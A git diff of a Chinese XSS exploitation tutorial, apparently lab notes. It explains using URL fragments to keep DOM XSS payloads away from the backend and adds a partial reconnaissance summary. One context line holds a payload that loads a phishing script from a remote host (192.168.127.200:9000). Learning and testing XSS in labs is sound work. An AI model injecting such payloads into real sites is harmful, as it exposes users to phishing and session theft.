@@ -192,7 +192,7 @@ if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
 但是在这之前，我们的请求是要发送给后端的，如果后端直接将请求给拒绝了，或者是向 mid 难度那样直接重定向再修改参数，那前端也是接收不到我们的 payload 的。
 
 在这里要科普一个小技巧，Get 请求中的 # 号表示位置标识符，某些页面内跳转的功能就是这么实现的，比如：
-https://github.com/donkeyQian/FIG/blob/dev/WEB/XSS/XSS%20漏洞利用.md#xss-reflected
+https://github.com/donkeyQian/FIG/blob/dev/WEB/XSS/XSS_Handwork.md#high-1
 
 而url # 后面的内容是不会传递给后端的，浏览器可以直接拿到这个数据。
 
@@ -779,3 +779,8 @@ payload: `<script src="http://192.168.127.200:9000/pkxss/xfish/fish.php"></scrip
 
 ![](../../image/Pasted%20image%2020230426143906.png)
 
+## 总结
+
+1. 侦查
+	1. 使用插件查看目标网站的安全策略，比如 httpOnly 和 CSP 策略，根据目标使用的安全策略制定 XSS 利用方案
+2. 
